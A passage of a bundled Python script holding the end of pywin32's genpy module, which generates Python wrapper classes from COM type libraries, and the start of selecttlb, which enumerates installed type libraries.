entry.hidden:\n                if entry.GetResultName():\n                    print("\\t# Result is of type " + entry.GetResultName(), file=stream)\n                if entry.wasProperty:\n                    print(\n                        "\\t# The method %s is actually a property, but must be used as a method to correctly pass the arguments"\n                        % name,\n                        file=stream,\n                    )\n                ret = self.MakeFuncMethod(entry, build.MakePublicAttributeName(name))\n                for line in ret:\n                    print(line, file=stream)\n        print("\\t_prop_map_get_ = {", file=stream)\n        names = list(self.propMap.keys())\n        names.sort()\n        for key in names:\n            entry = self.propMap[key]\n            if generator.bBuildHidden or not entry.hidden:\n                resultName = entry.GetResultName()\n                if resultName:\n                    print(\n                        "\\t\\t# Property \'%s\' is an object of type \'%s\'"\n                        % (key, resultName),\n                        file=stream,\n                    )\n                lkey = key.lower()\n                details = entry.desc\n                resultDesc = details[2]\n                argDesc = ()\n                mapEntry = MakeMapLineEntry(\n                    details.memid,\n                    pythoncom.DISPATCH_PROPERTYGET,\n                    resultDesc,\n                    argDesc,\n                    key,\n                    entry.GetResultCLSIDStr(),\n                )\n\n                if details.memid == pythoncom.DISPID_VALUE:\n                    lkey = "value"\n                elif details.memid == pythoncom.DISPID_NEWENUM:\n                    lkey = "_newenum"\n                else:\n                    lkey = key.lower()\n                if (\n                    lkey in specialItems and specialItems[lkey] is None\n                ):  # remember if a special one.\n                    specialItems[lkey] = (\n                        entry,\n                        pythoncom.DISPATCH_PROPERTYGET,\n                        mapEntry,\n                    )\n                    # All special methods, except _newenum, are written\n                    # "normally".  This is a mess!\n                    if details.memid == pythoncom.DISPID_NEWENUM:\n                        continue\n\n                print(\n                    \'\\t\\t"%s": %s,\' % (build.MakePublicAttributeName(key), mapEntry),\n                    file=stream,\n                )\n        names = list(self.propMapGet.keys())\n        names.sort()\n        for key in names:\n            entry = self.propMapGet[key]\n            if generator.bBuildHidden or not entry.hidden:\n                if entry.GetResultName():\n                    print(\n                        "\\t\\t# Method \'%s\' returns object of type \'%s\'"\n                        % (key, entry.GetResultName()),\n                        file=stream,\n                    )\n                details = entry.desc\n                assert details.desckind == pythoncom.DESCKIND_FUNCDESC\n                lkey = key.lower()\n                argDesc = details[2]\n                resultDesc = details[8]\n                mapEntry = MakeMapLineEntry(\n                    details[0],\n                    pythoncom.DISPATCH_PROPERTYGET,\n                    resultDesc,\n                    argDesc,\n                    key,\n                    entry.GetResultCLSIDStr(),\n                )\n                if details.memid == pythoncom.DISPID_VALUE:\n                    lkey = "value"\n                elif details.memid == pythoncom.DISPID_NEWENUM:\n                    lkey = "_newenum"\n                else:\n                    lkey = key.lower()\n                if (\n                    lkey in specialItems and specialItems[lkey] is None\n                ):  # remember if a special one.\n                    specialItems[lkey] = (\n                        entry,\n                        pythoncom.DISPATCH_PROPERTYGET,\n                        mapEntry,\n                    )\n                    # All special methods, except _newenum, are written\n                    # "normally".  This is a mess!\n                    if details.memid == pythoncom.DISPID_NEWENUM:\n                        continue\n                print(\n                    \'\\t\\t"%s": %s,\' % (build.MakePublicAttributeName(key), mapEntry),\n                    file=stream,\n                )\n\n        print("\\t}", file=stream)\n\n        print("\\t_prop_map_put_ = {", file=stream)\n        # These are "Invoke" args\n        names = list(self.propMap.keys())\n        names.sort()\n        for key in names:\n            entry = self.propMap[key]\n            if generator.bBuildHidden or not entry.hidden:\n                lkey = key.lower()\n                details = entry.desc\n                # If default arg is None, write an empty tuple\n                defArgDesc = build.MakeDefaultArgRepr(details[2])\n                if defArgDesc is None:\n                    defArgDesc = ""\n                else:\n                    defArgDesc = defArgDesc + ","\n                print(\n                    \'\\t\\t"%s" : ((%s, LCID, %d, 0),(%s)),\'\n                    % (\n                        build.MakePublicAttributeName(key),\n                        details[0],\n                        pythoncom.DISPATCH_PROPERTYPUT,\n                        defArgDesc,\n                    ),\n                    file=stream,\n                )\n\n        names = list(self.propMapPut.keys())\n        names.sort()\n        for key in names:\n            entry = self.propMapPut[key]\n            if generator.bBuildHidden or not entry.hidden:\n                details = entry.desc\n                defArgDesc = MakeDefaultArgsForPropertyPut(details[2])\n                print(\n                    \'\\t\\t"%s": ((%s, LCID, %d, 0),%s),\'\n                    % (\n                        build.MakePublicAttributeName(key),\n                        details[0],\n                        details[4],\n                        defArgDesc,\n                    ),\n                    file=stream,\n                )\n        print("\\t}", file=stream)\n\n        if specialItems["value"]:\n            entry, invoketype, propArgs = specialItems["value"]\n            if propArgs is None:\n                typename = "method"\n                ret = self.MakeFuncMethod(entry, "__call__")\n            else:\n                typename = "property"\n                ret = [\n                    "\\tdef __call__(self):\\n\\t\\treturn self._ApplyTypes_(*%s)"\n                    % propArgs\n                ]\n            print(\n                "\\t# Default %s for this class is \'%s\'" % (typename, entry.names[0]),\n                file=stream,\n            )\n            for line in ret:\n                print(line, file=stream)\n            print("\\tdef __str__(self, *args):", file=stream)\n            print("\\t\\treturn str(self.__call__(*args))", file=stream)\n            print("\\tdef __int__(self, *args):", file=stream)\n            print("\\t\\treturn int(self.__call__(*args))", file=stream)\n\n        # _NewEnum (DISPID_NEWENUM) does not appear in typelib for many office objects,\n        # but it can still be retrieved at runtime, so  always create __iter__.\n        # Also, some of those same objects use 1-based indexing, causing the old-style\n        # __getitem__ iteration to fail for index 0 where the dynamic iteration succeeds.\n        if specialItems["_newenum"]:\n            enumEntry, invoketype, propArgs = specialItems["_newenum"]\n            assert enumEntry.desc.desckind == pythoncom.DESCKIND_FUNCDESC\n            invkind = enumEntry.desc.invkind\n            # ??? Wouldn\'t this be the resultCLSID for the iterator itself, rather than the resultCLSID\n            #  for the result of each Next() call, which is what it\'s used for ???\n            resultCLSID = enumEntry.GetResultCLSIDStr()\n        else:\n            invkind = pythoncom.DISPATCH_METHOD | pythoncom.DISPATCH_PROPERTYGET\n            resultCLSID = "None"\n        # If we dont have a good CLSID for the enum result, assume it is the same as the Item() method.\n        if resultCLSID == "None" and "Item" in self.mapFuncs:\n            resultCLSID = self.mapFuncs["Item"].GetResultCLSIDStr()\n        print("\\tdef __iter__(self):", file=stream)\n        print(\'\\t\\t"Return a Python iterator for this object"\', file=stream)\n        print("\\t\\ttry:", file=stream)\n        print(\n            "\\t\\t\\tob = self._oleobj_.InvokeTypes(%d,LCID,%d,(13, 10),())"\n            % (pythoncom.DISPID_NEWENUM, invkind),\n            file=stream,\n        )\n        print("\\t\\texcept pythoncom.error:", file=stream)\n        print(\n            \'\\t\\t\\traise TypeError("This object does not support enumeration")\',\n            file=stream,\n        )\n        # Iterator is wrapped as PyIEnumVariant, and each result of __next__ is Dispatch\'ed if necessary\n        print(\n            "\\t\\treturn win32com.client.util.Iterator(ob, %s)" % resultCLSID,\n            file=stream,\n        )\n\n        if specialItems["item"]:\n            entry, invoketype, propArgs = specialItems["item"]\n            resultCLSID = entry.GetResultCLSIDStr()\n            print(\n                "\\t#This class has Item property/method which allows indexed access with the object[key] syntax.",\n                file=stream,\n            )\n            print(\n                "\\t#Some objects will accept a string or other type of key in addition to integers.",\n                file=stream,\n            )\n            print(\n                "\\t#Note that many Office objects do not use zero-based indexing.",\n                file=stream,\n            )\n            print("\\tdef __getitem__(self, key):", file=stream)\n            print(\n                \'\\t\\treturn self._get_good_object_(self._oleobj_.Invoke(*(%d, LCID, %d, 1, key)), "Item", %s)\'\n                % (entry.desc.memid, invoketype, resultCLSID),\n                file=stream,\n            )\n\n        if specialItems["count"]:\n            entry, invoketype, propArgs = specialItems["count"]\n            if propArgs is None:\n                typename = "method"\n                ret = self.MakeFuncMethod(entry, "__len__")\n            else:\n                typename = "property"\n                ret = [\n                    "\\tdef __len__(self):\\n\\t\\treturn self._ApplyTypes_(*%s)" % propArgs\n                ]\n            print(\n                "\\t#This class has Count() %s - allow len(ob) to provide this"\n                % (typename),\n                file=stream,\n            )\n            for line in ret:\n                print(line, file=stream)\n            # Also include a __nonzero__\n            print(\n                "\\t#This class has a __len__ - this is needed so \'if object:\' always returns TRUE.",\n                file=stream,\n            )\n            print("\\tdef __nonzero__(self):", file=stream)\n            print("\\t\\treturn True", file=stream)\n\n\nclass CoClassItem(build.OleItem, WritableItem):\n    order = 5\n    typename = "COCLASS"\n\n    def __init__(self, typeinfo, attr, doc=None, sources=[], interfaces=[], bForUser=1):\n        build.OleItem.__init__(self, doc)\n        self.clsid = attr[0]\n        self.sources = sources\n        self.interfaces = interfaces\n        self.bIsDispatch = 1  # Pretend it is so it is written to the class map.\n\n    def WriteClass(self, generator):\n        generator.checkWriteCoClassBaseClass()\n        doc = self.doc\n        stream = generator.file\n        if generator.generate_type == GEN_DEMAND_CHILD:\n            # Some special imports we must setup.\n            referenced_items = []\n            for ref, flag in self.sources:\n                referenced_items.append(ref)\n            for ref, flag in self.interfaces:\n                referenced_items.append(ref)\n            print("import sys", file=stream)\n            for ref in referenced_items:\n                print(\n                    "__import__(\'%s.%s\')" % (generator.base_mod_name, ref.python_name),\n                    file=stream,\n                )\n                print(\n                    "%s = sys.modules[\'%s.%s\'].%s"\n                    % (\n                        ref.python_name,\n                        generator.base_mod_name,\n                        ref.python_name,\n                        ref.python_name,\n                    ),\n                    file=stream,\n                )\n                # And pretend we have written it - the name is now available as if we had!\n                ref.bWritten = 1\n        try:\n            progId = pythoncom.ProgIDFromCLSID(self.clsid)\n            print("# This CoClass is known by the name \'%s\'" % (progId), file=stream)\n        except pythoncom.com_error:\n            pass\n        print(\n            "class %s(CoClassBaseClass): # A CoClass" % (self.python_name), file=stream\n        )\n        if doc and doc[1]:\n            print("\\t# " + doc[1], file=stream)\n        print("\\tCLSID = %r" % (self.clsid,), file=stream)\n        print("\\tcoclass_sources = [", file=stream)\n        defItem = None\n        for item, flag in self.sources:\n            if flag & pythoncom.IMPLTYPEFLAG_FDEFAULT:\n                defItem = item\n            # If we have written a Python class, reference the name -\n            # otherwise just the IID.\n            if item.bWritten:\n                key = item.python_name\n            else:\n                key = repr(str(item.clsid))  # really the iid.\n            print("\\t\\t%s," % (key), file=stream)\n        print("\\t]", file=stream)\n        if defItem:\n            if defItem.bWritten:\n                defName = defItem.python_name\n            else:\n                defName = repr(str(defItem.clsid))  # really the iid.\n            print("\\tdefault_source = %s" % (defName,), file=stream)\n        print("\\tcoclass_interfaces = [", file=stream)\n        defItem = None\n        for item, flag in self.interfaces:\n            if flag & pythoncom.IMPLTYPEFLAG_FDEFAULT:  # and dual:\n                defItem = item\n            # If we have written a class, reference its name, otherwise the IID\n            if item.bWritten:\n                key = item.python_name\n            else:\n                key = repr(str(item.clsid))  # really the iid.\n            print("\\t\\t%s," % (key,), file=stream)\n        print("\\t]", file=stream)\n        if defItem:\n            if defItem.bWritten:\n                defName = defItem.python_name\n            else:\n                defName = repr(str(defItem.clsid))  # really the iid.\n            print("\\tdefault_interface = %s" % (defName,), file=stream)\n        self.bWritten = 1\n        print(file=stream)\n\n\nclass GeneratorProgress:\n    def __init__(self):\n        pass\n\n    def Starting(self, tlb_desc):\n        """Called when the process starts."""\n        self.tlb_desc = tlb_desc\n\n    def Finished(self):\n        """Called when the process is complete."""\n\n    def SetDescription(self, desc, maxticks=None):\n        """We are entering a major step.  If maxticks, then this\n        is how many ticks we expect to make until finished\n        """\n\n    def Tick(self, desc=None):\n        """Minor progress step.  Can provide new description if necessary"""\n\n    def VerboseProgress(self, desc):\n        """Verbose/Debugging output."""\n\n    def LogWarning(self, desc):\n        """If a warning is generated"""\n\n    def LogBeginGenerate(self, filename):\n        pass\n\n    def Close(self):\n        pass\n\n\nclass Generator:\n    def __init__(\n        self,\n        typelib,\n        sourceFilename,\n        progressObject,\n        bBuildHidden=1,\n        bUnicodeToString=None,\n    ):\n        assert bUnicodeToString is None, "this is deprecated and will go away"\n        self.bHaveWrittenDispatchBaseClass = 0\n        self.bHaveWrittenCoClassBaseClass = 0\n        self.bHaveWrittenEventBaseClass = 0\n        self.typelib = typelib\n        self.sourceFilename = sourceFilename\n        self.bBuildHidden = bBuildHidden\n        self.progress = progressObject\n        # These 2 are later additions and most of the code still \'print\'s...\n        self.file = None\n\n    def CollectOleItemInfosFromType(self):\n        ret = []\n        for i in range(self.typelib.GetTypeInfoCount()):\n            info = self.typelib.GetTypeInfo(i)\n            infotype = self.typelib.GetTypeInfoType(i)\n            doc = self.typelib.GetDocumentation(i)\n            attr = info.GetTypeAttr()\n            ret.append((info, infotype, doc, attr))\n        return ret\n\n    def _Build_CoClass(self, type_info_tuple):\n        info, infotype, doc, attr = type_info_tuple\n        # find the source and dispinterfaces for the coclass\n        child_infos = []\n        for j in range(attr[8]):\n            flags = info.GetImplTypeFlags(j)\n            try:\n                refType = info.GetRefTypeInfo(info.GetRefTypeOfImplType(j))\n            except pythoncom.com_error:\n                # Can\'t load a dependent typelib?\n                continue\n            refAttr = refType.GetTypeAttr()\n            child_infos.append(\n                (\n                    info,\n                    refAttr.typekind,\n                    refType,\n                    refType.GetDocumentation(-1),\n                    refAttr,\n                    flags,\n                )\n            )\n\n        # Done generating children - now the CoClass itself.\n        newItem = CoClassItem(info, attr, doc)\n        return newItem, child_infos\n\n    def _Build_CoClassChildren(self, coclass, coclass_info, oleItems, vtableItems):\n        sources = {}\n        interfaces = {}\n        for info, info_type, refType, doc, refAttr, flags in coclass_info:\n            #          sys.stderr.write("Attr typeflags for coclass referenced object %s=%d (%d), typekind=%d\\n" % (name, refAttr.wTypeFlags, refAttr.wTypeFlags & pythoncom.TYPEFLAG_FDUAL,refAttr.typekind))\n            if refAttr.typekind == pythoncom.TKIND_DISPATCH or (\n                refAttr.typekind == pythoncom.TKIND_INTERFACE\n                and refAttr[11] & pythoncom.TYPEFLAG_FDISPATCHABLE\n            ):\n                clsid = refAttr[0]\n                if clsid in oleItems:\n                    dispItem = oleItems[clsid]\n                else:\n                    dispItem = DispatchItem(refType, refAttr, doc)\n                    oleItems[dispItem.clsid] = dispItem\n                dispItem.coclass_clsid = coclass.clsid\n                if flags & pythoncom.IMPLTYPEFLAG_FSOURCE:\n                    dispItem.bIsSink = 1\n                    sources[dispItem.clsid] = (dispItem, flags)\n                else:\n                    interfaces[dispItem.clsid] = (dispItem, flags)\n                # If dual interface, make do that too.\n                if clsid not in vtableItems and refAttr[11] & pythoncom.TYPEFLAG_FDUAL:\n                    refType = refType.GetRefTypeInfo(refType.GetRefTypeOfImplType(-1))\n                    refAttr = refType.GetTypeAttr()\n                    assert (\n                        refAttr.typekind == pythoncom.TKIND_INTERFACE\n                    ), "must be interface bynow!"\n                    vtableItem = VTableItem(refType, refAttr, doc)\n                    vtableItems[clsid] = vtableItem\n        coclass.sources = list(sources.values())\n        coclass.interfaces = list(interfaces.values())\n\n    def _Build_Interface(self, type_info_tuple):\n        info, infotype, doc, attr = type_info_tuple\n        oleItem = vtableItem = None\n        if infotype == pythoncom.TKIND_DISPATCH or (\n            infotype == pythoncom.TKIND_INTERFACE\n            and attr[11] & pythoncom.TYPEFLAG_FDISPATCHABLE\n        ):\n            oleItem = DispatchItem(info, attr, doc)\n            # If this DISPATCH interface dual, then build that too.\n            if attr.wTypeFlags & pythoncom.TYPEFLAG_FDUAL:\n                # Get the vtable interface\n                refhtype = info.GetRefTypeOfImplType(-1)\n                info = info.GetRefTypeInfo(refhtype)\n                attr = info.GetTypeAttr()\n                infotype = pythoncom.TKIND_INTERFACE\n            else:\n                infotype = None\n        assert infotype in [\n            None,\n            pythoncom.TKIND_INTERFACE,\n        ], "Must be a real interface at this point"\n        if infotype == pythoncom.TKIND_INTERFACE:\n            vtableItem = VTableItem(info, attr, doc)\n        return oleItem, vtableItem\n\n    def BuildOleItemsFromType(self):\n        assert (\n            self.bBuildHidden\n        ), "This code doesnt look at the hidden flag - I thought everyone set it true!?!?!"\n        oleItems = {}\n        enumItems = {}\n        recordItems = {}\n        vtableItems = {}\n\n        for type_info_tuple in self.CollectOleItemInfosFromType():\n            info, infotype, doc, attr = type_info_tuple\n            clsid = attr[0]\n            if infotype == pythoncom.TKIND_ENUM or infotype == pythoncom.TKIND_MODULE:\n                newItem = EnumerationItem(info, attr, doc)\n                enumItems[newItem.doc[0]] = newItem\n            # We never hide interfaces (MSAccess, for example, nominates interfaces as\n            # hidden, assuming that you only ever use them via the CoClass)\n            elif infotype in [pythoncom.TKIND_DISPATCH, pythoncom.TKIND_INTERFACE]:\n                if clsid not in oleItems:\n                    oleItem, vtableItem = self._Build_Interface(type_info_tuple)\n                    oleItems[clsid] = oleItem  # Even "None" goes in here.\n                    if vtableItem is not None:\n                        vtableItems[clsid] = vtableItem\n            elif (\n                infotype == pythoncom.TKIND_RECORD or infotype == pythoncom.TKIND_UNION\n            ):\n                newItem = RecordItem(info, attr, doc)\n                recordItems[newItem.clsid] = newItem\n            elif infotype == pythoncom.TKIND_ALIAS:\n                # We dont care about alias\' - handled intrinsicly.\n                continue\n            elif infotype == pythoncom.TKIND_COCLASS:\n                newItem, child_infos = self._Build_CoClass(type_info_tuple)\n                self._Build_CoClassChildren(newItem, child_infos, oleItems, vtableItems)\n                oleItems[newItem.clsid] = newItem\n            else:\n                self.progress.LogWarning("Unknown TKIND found: %d" % infotype)\n\n        return oleItems, enumItems, recordItems, vtableItems\n\n    def open_writer(self, filename, encoding="mbcs"):\n        # A place to put code to open a file with the appropriate encoding.\n        # Does *not* set self.file - just opens and returns a file.\n        # Actually returns a handle to a temp file - finish_writer then deletes\n        # the filename asked for and puts everything back in place.  This\n        # is so errors don\'t leave a 1/2 generated file around causing bizarre\n        # errors later, and so that multiple processes writing the same file\n        # don\'t step on each others\' toes.\n        # Could be a classmethod one day...\n        temp_filename = self.get_temp_filename(filename)\n        return open(temp_filename, "wt", encoding=encoding)\n\n    def finish_writer(self, filename, f, worked):\n        f.close()\n        try:\n            os.unlink(filename)\n        except os.error:\n            pass\n        temp_filename = self.get_temp_filename(filename)\n        if worked:\n            try:\n                os.rename(temp_filename, filename)\n            except os.error:\n                # If we are really unlucky, another process may have written the\n                # file in between our calls to os.unlink and os.rename. So try\n                # again, but only once.\n                # There are still some race conditions, but they seem difficult to\n                # fix, and they probably occur much less frequently:\n                # * The os.rename failure could occur more than once if more than\n                #   two processes are involved.\n                # * In between os.unlink and os.rename, another process could try\n                #   to import the module, having seen that it already exists.\n                # * If another process starts a COM server while we are still\n                #   generating __init__.py, that process sees that the folder\n                #   already exists and assumes that __init__.py is already there\n                #   as well.\n                try:\n                    os.unlink(filename)\n                except os.error:\n                    pass\n                os.rename(temp_filename, filename)\n        else:\n            os.unlink(temp_filename)\n\n    def get_temp_filename(self, filename):\n        return "%s.%d.temp" % (filename, os.getpid())\n\n    def generate(self, file, is_for_demand=0):\n        if is_for_demand:\n            self.generate_type = GEN_DEMAND_BASE\n        else:\n            self.generate_type = GEN_FULL\n        self.file = file\n        self.do_generate()\n        self.file = None\n        self.progress.Finished()\n\n    def do_gen_file_header(self):\n        la = self.typelib.GetLibAttr()\n        moduleDoc = self.typelib.GetDocumentation(-1)\n        docDesc = ""\n        if moduleDoc[1]:\n            docDesc = moduleDoc[1]\n\n        # Reset all the \'per file\' state\n        self.bHaveWrittenDispatchBaseClass = 0\n        self.bHaveWrittenCoClassBaseClass = 0\n        self.bHaveWrittenEventBaseClass = 0\n        # You must provide a file correctly configured for writing unicode.\n        # We assert this is it may indicate somewhere in pywin32 that needs\n        # upgrading.\n        assert self.file.encoding, self.file\n        encoding = self.file.encoding  # or "mbcs"\n\n        print("# -*- coding: %s -*-" % (encoding,), file=self.file)\n        print("# Created by makepy.py version %s" % (makepy_version,), file=self.file)\n        print(\n            "# By python version %s" % (sys.version.replace("\\n", "-"),), file=self.file\n        )\n        if self.sourceFilename:\n            print(\n                "# From type library \'%s\'" % (os.path.split(self.sourceFilename)[1],),\n                file=self.file,\n            )\n        print("# On %s" % time.ctime(time.time()), file=self.file)\n\n        print(build._makeDocString(docDesc), file=self.file)\n\n        print("makepy_version =", repr(makepy_version), file=self.file)\n        print("python_version = 0x%x" % (sys.hexversion,), file=self.file)\n        print(file=self.file)\n        print(\n            "import win32com.client.CLSIDToClass, pythoncom, pywintypes", file=self.file\n        )\n        print("import win32com.client.util", file=self.file)\n        print("from pywintypes import IID", file=self.file)\n        print("from win32com.client import Dispatch", file=self.file)\n        print(file=self.file)\n        print(\n            "# The following 3 lines may need tweaking for the particular server",\n            file=self.file,\n        )\n        print(\n            "# Candidates are pythoncom.Missing, .Empty and .ArgNotFound",\n            file=self.file,\n        )\n        print("defaultNamedOptArg=pythoncom.Empty", file=self.file)\n        print("defaultNamedNotOptArg=pythoncom.Empty", file=self.file)\n        print("defaultUnnamedArg=pythoncom.Empty", file=self.file)\n        print(file=self.file)\n        print("CLSID = " + repr(la[0]), file=self.file)\n        print("MajorVersion = " + str(la[3]), file=self.file)\n        print("MinorVersion = " + str(la[4]), file=self.file)\n        print("LibraryFlags = " + str(la[5]), file=self.file)\n        print("LCID = " + hex(la[1]), file=self.file)\n        print(file=self.file)\n\n    def do_generate(self):\n        moduleDoc = self.typelib.GetDocumentation(-1)\n        stream = self.file\n        docDesc = ""\n        if moduleDoc[1]:\n            docDesc = moduleDoc[1]\n        self.progress.Starting(docDesc)\n        self.progress.SetDescription("Building definitions from type library...")\n\n        self.do_gen_file_header()\n\n        oleItems, enumItems, recordItems, vtableItems = self.BuildOleItemsFromType()\n\n        self.progress.SetDescription(\n            "Generating...", len(oleItems) + len(enumItems) + len(vtableItems)\n        )\n\n        # Generate the constants and their support.\n        if enumItems:\n            print("class constants:", file=stream)\n            items = list(enumItems.values())\n            items.sort()\n            num_written = 0\n            for oleitem in items:\n                num_written += oleitem.WriteEnumerationItems(stream)\n                self.progress.Tick()\n            if not num_written:\n                print("\\tpass", file=stream)\n            print(file=stream)\n\n        if self.generate_type == GEN_FULL:\n            items = [l for l in oleItems.values() if l is not None]\n            items.sort()\n            for oleitem in items:\n                self.progress.Tick()\n                oleitem.WriteClass(self)\n\n            items = list(vtableItems.values())\n            items.sort()\n            for oleitem in items:\n                self.progress.Tick()\n                oleitem.WriteClass(self)\n        else:\n            self.progress.Tick(len(oleItems) + len(vtableItems))\n\n        print("RecordMap = {", file=stream)\n        for record in recordItems.values():\n            if record.clsid == pythoncom.IID_NULL:\n                print(\n                    "\\t###%s: %s, # Record disabled because it doesn\'t have a non-null GUID"\n                    % (repr(record.doc[0]), repr(str(record.clsid))),\n                    file=stream,\n                )\n            else:\n                print(\n                    "\\t%s: %s," % (repr(record.doc[0]), repr(str(record.clsid))),\n                    file=stream,\n                )\n        print("}", file=stream)\n        print(file=stream)\n\n        # Write out _all_ my generated CLSID\'s in the map\n        if self.generate_type == GEN_FULL:\n            print("CLSIDToClassMap = {", file=stream)\n            for item in oleItems.values():\n                if item is not None and item.bWritten:\n                    print(\n                        "\\t\'%s\' : %s," % (str(item.clsid), item.python_name),\n                        file=stream,\n                    )\n            print("}", file=stream)\n            print("CLSIDToPackageMap = {}", file=stream)\n            print(\n                "win32com.client.CLSIDToClass.RegisterCLSIDsFromDict( CLSIDToClassMap )",\n                file=stream,\n            )\n            print("VTablesToPackageMap = {}", file=stream)\n            print("VTablesToClassMap = {", file=stream)\n            for item in vtableItems.values():\n                print("\\t\'%s\' : \'%s\'," % (item.clsid, item.python_name), file=stream)\n            print("}", file=stream)\n            print(file=stream)\n\n        else:\n            print("CLSIDToClassMap = {}", file=stream)\n            print("CLSIDToPackageMap = {", file=stream)\n            for item in oleItems.values():\n                if item is not None:\n                    print(\n                        "\\t\'%s\' : %s," % (str(item.clsid), repr(item.python_name)),\n                        file=stream,\n                    )\n            print("}", file=stream)\n            print("VTablesToClassMap = {}", file=stream)\n            print("VTablesToPackageMap = {", file=stream)\n            for item in vtableItems.values():\n                print("\\t\'%s\' : \'%s\'," % (item.clsid, item.python_name), file=stream)\n            print("}", file=stream)\n            print(file=stream)\n\n        print(file=stream)\n        # Bit of a hack - build a temp map of iteItems + vtableItems - coClasses\n        map = {}\n        for item in oleItems.values():\n            if item is not None and not isinstance(item, CoClassItem):\n                map[item.python_name] = item.clsid\n        for item in vtableItems.values():  # No nones or CoClasses in this map\n            map[item.python_name] = item.clsid\n\n        print("NamesToIIDMap = {", file=stream)\n        for name, iid in map.items():\n            print("\\t\'%s\' : \'%s\'," % (name, iid), file=stream)\n        print("}", file=stream)\n        print(file=stream)\n\n        if enumItems:\n            print(\n                "win32com.client.constants.__dicts__.append(constants.__dict__)",\n                file=stream,\n            )\n        print(file=stream)\n\n    def generate_child(self, child, dir):\n        "Generate a single child.  May force a few children to be built as we generate deps"\n        self.generate_type = GEN_DEMAND_CHILD\n\n        la = self.typelib.GetLibAttr()\n        lcid = la[1]\n        clsid = la[0]\n        major = la[3]\n        minor = la[4]\n        self.base_mod_name = (\n            "win32com.gen_py." + str(clsid)[1:-1] + "x%sx%sx%s" % (lcid, major, minor)\n        )\n        try:\n            # Process the type library\'s CoClass objects, looking for the\n            # specified name, or where a child has the specified name.\n            # This ensures that all interesting things (including event interfaces)\n            # are generated correctly.\n            oleItems = {}\n            vtableItems = {}\n            infos = self.CollectOleItemInfosFromType()\n            found = 0\n            for type_info_tuple in infos:\n                info, infotype, doc, attr = type_info_tuple\n                if infotype == pythoncom.TKIND_COCLASS:\n                    coClassItem, child_infos = self._Build_CoClass(type_info_tuple)\n                    found = build.MakePublicAttributeName(doc[0]) == child\n                    if not found:\n                        # OK, check the child interfaces\n                        for (\n                            info,\n                            info_type,\n                            refType,\n                            doc,\n                            refAttr,\n                            flags,\n                        ) in child_infos:\n                            if build.MakePublicAttributeName(doc[0]) == child:\n                                found = 1\n                                break\n                    if found:\n                        oleItems[coClassItem.clsid] = coClassItem\n                        self._Build_CoClassChildren(\n                            coClassItem, child_infos, oleItems, vtableItems\n                        )\n                        break\n            if not found:\n                # Doesn\'t appear in a class defn - look in the interface objects for it\n                for type_info_tuple in infos:\n                    info, infotype, doc, attr = type_info_tuple\n                    if infotype in [\n                        pythoncom.TKIND_INTERFACE,\n                        pythoncom.TKIND_DISPATCH,\n                    ]:\n                        if build.MakePublicAttributeName(doc[0]) == child:\n                            found = 1\n                            oleItem, vtableItem = self._Build_Interface(type_info_tuple)\n                            oleItems[clsid] = oleItem  # Even "None" goes in here.\n                            if vtableItem is not None:\n                                vtableItems[clsid] = vtableItem\n\n            assert (\n                found\n            ), "Cant find the \'%s\' interface in the CoClasses, or the interfaces" % (\n                child,\n            )\n            # Make a map of iid: dispitem, vtableitem)\n            items = {}\n            for key, value in oleItems.items():\n                items[key] = (value, None)\n            for key, value in vtableItems.items():\n                existing = items.get(key, None)\n                if existing is not None:\n                    new_val = existing[0], value\n                else:\n                    new_val = None, value\n                items[key] = new_val\n\n            self.progress.SetDescription("Generating...", len(items))\n            for oleitem, vtableitem in items.values():\n                an_item = oleitem or vtableitem\n                assert not self.file, "already have a file?"\n                # like makepy.py, we gen to a .temp file so failure doesn\'t\n                # leave a 1/2 generated mess.\n                out_name = os.path.join(dir, an_item.python_name) + ".py"\n                worked = False\n                self.file = self.open_writer(out_name)\n                try:\n                    if oleitem is not None:\n                        self.do_gen_child_item(oleitem)\n                    if vtableitem is not None:\n                        self.do_gen_child_item(vtableitem)\n                    self.progress.Tick()\n                    worked = True\n                finally:\n                    self.finish_writer(out_name, self.file, worked)\n                    self.file = None\n        finally:\n            self.progress.Finished()\n\n    def do_gen_child_item(self, oleitem):\n        moduleDoc = self.typelib.GetDocumentation(-1)\n        docDesc = ""\n        if moduleDoc[1]:\n            docDesc = moduleDoc[1]\n        self.progress.Starting(docDesc)\n        self.progress.SetDescription("Building definitions from type library...")\n        self.do_gen_file_header()\n        oleitem.WriteClass(self)\n        if oleitem.bWritten:\n            print(\n                \'win32com.client.CLSIDToClass.RegisterCLSID( "%s", %s )\'\n                % (oleitem.clsid, oleitem.python_name),\n                file=self.file,\n            )\n\n    def checkWriteDispatchBaseClass(self):\n        if not self.bHaveWrittenDispatchBaseClass:\n            print("from win32com.client import DispatchBaseClass", file=self.file)\n            self.bHaveWrittenDispatchBaseClass = 1\n\n    def checkWriteCoClassBaseClass(self):\n        if not self.bHaveWrittenCoClassBaseClass:\n            print("from win32com.client import CoClassBaseClass", file=self.file)\n            self.bHaveWrittenCoClassBaseClass = 1\n\n    def checkWriteEventBaseClass(self):\n        # Not a base class as such...\n        if not self.bHaveWrittenEventBaseClass:\n            # Nothing to do any more!\n            self.bHaveWrittenEventBaseClass = 1\n\n\nif __name__ == "__main__":\n    print("This is a worker module.  Please use makepy to generate Python files.")\n')
    __stickytape_write_module('win32com/client/selecttlb.py', b'"""Utilities for selecting and enumerating the Type Libraries installed on the system\n"""\n\nimport win32api, win32con, pythoncom\n\n\nclass TypelibSpec:\n    def __init__(self, clsid, lcid, major, minor, flags=0):\n        self.clsid = str(clsid)\n        self.lcid = int(lcid)\n        # We avoid assuming \'major\' or \'minor\' are integers - when\n        # read from the registry there is some confusion about if\n        # they are base 10 or base 16 (they *should* be base 16, but\n        # how they are written is beyond our control.)\n        self.major = major\n        self.minor = minor\n        self.dll = None\n        self.desc = None\n        self.ver_desc = None\n        self.flags = flags\n\n    # For the SelectList\n    def __getitem__(self, item):\n        if item == 0:\n            return self.ver_desc\n        raise IndexError("Cant index me!")\n\n    def __lt__(self, other):  # rich-cmp/py3k-friendly version\n        me = (\n            (self.ver_desc or "").lower(),\n            (self.desc or "").lower(),\n            self.major,\n            self.minor,\n        )\n        them = (\n            (other.ver_desc or "").lower(),\n            (other.desc or "").lower(),\n            other.major,\n            other.minor,\n        )\n        return me < them\n\n    def __eq__(self, other):  # rich-cmp/py3k-friendly version\n        return (\n            (self.ver_desc or "").lower() == (other.ver_desc or "").lower()\n            and (self.desc or "").lower() == (other.desc or "").lower()\n            and self.major == other.major\n            and self.minor == other.minor\n        )\n\n    def Resolve(self):\n        if self.dll is None:\n            return 0\n        tlb = pythoncom.LoadTypeLib(self.dll)\n        self.FromTypelib(tlb, None)\n        return 